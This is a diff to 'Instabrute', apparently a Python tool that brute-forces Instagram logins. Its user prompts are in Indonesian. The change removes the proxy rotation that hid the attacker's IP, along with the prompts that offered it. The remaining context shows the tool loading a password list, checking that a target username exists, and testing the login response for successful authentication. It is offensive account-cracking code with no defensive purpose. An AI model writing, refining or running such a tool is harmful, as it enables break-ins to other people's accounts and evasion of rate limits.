@@ -1,6 +1,6 @@
 '''
 TODO LIST:
-	Fix and make proxy function better
+	No proxy
 	Sort code again
 	Add help function to all "Yes/no" questions
 	Add help  function to "Press enter to exit input"
@@ -35,11 +35,6 @@ class Instabrute():
 		self.IsUserExists()
 
 
-		UsePorxy = Input('[*] Mau pakai proxy ? (y/n): ').upper()
-		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-			self.randomProxy()
-
-
 	#Check if password file exists and check if he contain passwords
 	def loadPasswords(self):
 		if os.path.isfile(self.passwordsFile):
@@ -56,22 +51,6 @@ class Instabrute():
 			print ('Tolong untuk membuat file password bernama "%s"' % self.passwordsFile)
 			Input('[*] Tekan enter untuk keluar')
 			exit()
-
-	#Choose random proxy from proxys file
-	def randomProxy(self):
-		plist = open('proxy.txt').read().splitlines()
-		proxy = random.choice(plist)
-
-		if not proxy in self.UsedProxys:
-			self.CurrentProxy = proxy
-			self.UsedProxys.append(proxy)
-		try:
-			print('')
-			print('[*] Mengecek IP baru...')
-			print ('[*] IP publik mu: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
-		except Exception as e:
-			print  ('[*] Tak bisa mencapai proxy "%s"' % proxy)
-		print('')
 
 
 	#Check if username exists in instagram server
@@ -120,12 +99,6 @@ class Instabrute():
 		data = json.loads(r.text)
 		if (data['status'] == 'fail'):
 			print (data['message'])
-
-			UsePorxy = Input('[*] Mau pakai proxy ? (y/n): ').upper()
-			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-				print ('[$] Mencoba kembali proxy setelah gagal')
-				randomProxy() #Check that, may contain bugs
-			return False
 
 		#return session if password is correct 
 		if (data['authenticated'] == True):
